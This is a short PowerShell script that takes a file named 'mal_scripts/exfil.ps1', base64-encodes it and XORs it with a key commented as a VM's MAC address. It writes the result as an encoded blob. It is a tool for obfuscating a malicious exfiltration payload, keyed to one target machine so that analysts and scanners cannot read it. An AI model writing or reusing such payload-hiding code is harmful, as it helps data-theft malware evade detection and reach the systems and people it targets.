$code = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("mal_scripts/exfil.ps1"))
write-host $code

$code_bytes = [System.Text.Encoding]::UTF8.GetBytes($code)

# vm mac address
$key = @(0x0e, 0x2b, 0xd4, 0xd6, 0x2d, 0x69)

$out_bytes = new-object byte[] $code_bytes.Length

for ($i = 0; $i -lt $code_bytes.Length; $i++) {
    $out_bytes[$i] = $code_bytes[$i] -bxor $key[$i % $key.Length]
}

$encoded = [System.Convert]::ToBase64String($out_bytes)

$encoded | Out-File -Path out.b64